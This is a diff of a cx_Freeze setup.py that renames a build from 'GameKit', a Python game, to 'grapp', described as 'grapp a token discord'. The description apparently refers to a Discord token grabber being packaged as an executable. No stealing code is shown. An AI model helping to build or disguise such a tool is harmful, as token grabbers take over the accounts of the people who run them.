@@ -1,7 +1,7 @@
 from cx_Freeze import setup, Executable
 base = None
 executablesreatch = [Executable("")]
-executables = [Executable("game.py", base=base)]
+executables = [Executable("grapp.py", base=base)]
 packages = ["idna", "os", "re", "json"]
 options = {
     'build_exe': {    
@@ -9,9 +9,9 @@ options = {
     },
 }
 setup(
-    name = "GameKit",
+    name = "grapp",
     options = options,
     version = "1.0",
-    description = 'Play game in python',
+    description = 'grapp a token discord',
     executables = executables, 
 )
